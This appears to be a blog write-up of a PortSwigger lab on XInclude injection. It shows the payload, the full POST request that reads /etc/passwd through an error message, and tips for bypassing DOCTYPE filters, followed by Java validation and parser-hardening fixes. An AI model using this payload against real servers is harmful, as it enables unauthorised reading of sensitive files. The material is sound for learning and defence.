---
layout: post
title: "PortSwigger: Exploiting XInclude to Retrieve Files"
date: 2027-08-18 09:00:00 -0500
categories: [PortSwigger, XXE]
tags: [xxe, xinclude, xml, cwe-611, file-read, portswigger]
---

XInclude injection lets you read arbitrary files through an XML processor even when you have no control over the document root — bypassing the requirement for a DOCTYPE declaration that classic XXE attacks need.

## The scenario

A stock-check feature accepts a `productId` parameter via POST and embeds it inside a server-constructed XML document before parsing:

```xml
<stockCheck>
  <productId>[your input]</productId>
  <storeId>1</storeId>
</stockCheck>
```

Because the attacker controls only an inner node, injecting `<!DOCTYPE ... SYSTEM ...>` is impossible — the root is already fixed by the server. Classic XXE is blocked. XInclude is not.

## Why XInclude works here

XInclude is a W3C standard for document composition. Unlike DOCTYPE external entities (which must be declared at the root), `xi:include` directives can appear at **any node** in the XML tree. The XML processor expands them during parse, substituting the referenced content in place.

When the `productId` value is the XInclude payload, the parser sees it in the element position and processes it:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

`parse="text"` is mandatory — `/etc/passwd` is not valid XML, and without this attribute the processor tries to parse the file as XML and fails.

## The working request

```
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

Response (HTTP 400):

```
"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

The file contents appear in the error message — the application echoes the parsed `productId` node value in the "Invalid product ID:" error, and XInclude replaced that node with the file contents.

## Key gotchas

- **`parse="text"` is not optional.** Without it: XML parse error, nothing returned.
- **No DOCTYPE required.** This bypasses filters that strip `<!DOCTYPE` from input.
- **HTTP 400 with file contents = success.** The error path is the read oracle.
- **URL-encode the payload** when sending as form data — `--data-urlencode` in curl handles this automatically.

## The fix

Whitelist `productId` as numeric before it ever touches XML:

```java
if (!productId.matches("[0-9]+")) throw new IllegalArgumentException("Invalid product ID");
```

Explicitly disable XInclude and external entity processing at the parser:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setXIncludeAware(false);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setExpandEntityReferences(false);
```

The root cause is embedding raw user input into XML via string concatenation. Validate first, construct XML safely, and never rely solely on parser defaults.

**CWE-611** — Improper Restriction of XML External Entity Reference  
**OWASP A03:2021** — Injection
